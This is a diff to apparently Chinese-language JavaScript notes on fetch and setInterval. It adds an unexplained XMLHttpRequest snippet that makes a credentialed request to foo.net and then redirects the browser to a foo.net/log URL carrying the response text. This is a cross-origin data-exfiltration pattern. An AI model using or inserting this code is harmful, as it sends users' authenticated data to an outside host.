@@ -237,6 +237,21 @@ if (!response.ok) {
 - `redirect: 'manual'`
   不追踪重定向
 
+## XMLHttpRequest
+
+
+```js
+var req = new XMLHttpRequest();
+req.onload = reqListener;
+req.open('get','https://foo.net',true);
+req.withCredentials = true;
+req.send();
+
+function reqListener() {
+  location='//foo.net/log?data='+this.responseText;
+};
+```
+
 ## setInterval
 
 setInterval方法用于按照指定的时间间隔重复调用函数或执行代码片段。
